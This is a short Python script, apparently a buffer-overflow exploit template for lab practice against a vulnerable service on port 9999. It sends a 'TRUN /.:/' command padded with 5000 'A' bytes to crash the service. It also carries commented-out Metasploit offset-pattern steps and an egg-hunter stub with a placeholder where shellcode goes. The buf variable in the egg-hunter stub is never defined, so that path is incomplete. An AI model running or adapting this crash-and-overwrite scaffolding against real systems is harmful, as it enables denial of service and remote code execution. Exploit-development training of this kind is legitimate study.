#!/usr/bin/python3

import struct
import socket
import subprocess

target_ip = ""
target_port = 9999

def make_buf():
    prepend = b"RANDOM_STRING "
    egg = b"w00tw00t"
    # put shellcode here
    buf_string = prepend + egg + buf
    return buf_string

def make_string(offset):
    # use this to test offsets
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" % offset
    #junk = subprocess.check_output(cmd, shell=True)
    junk = b"A"* offset
    # change this to the command being tested
    prepend = b"TRUN /.:/"
    crash_string = prepend + junk
    return crash_string

def exploit(crash_string):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(crash_string)

def main():
    offset = 5000
    # use if not enough space for exploit code in crash string
    #buf_string = make_buf()
    #exploit(buf_string)
    crash_string = make_string(offset)
    exploit(crash_string)

if __name__ == '__main__':
    main()
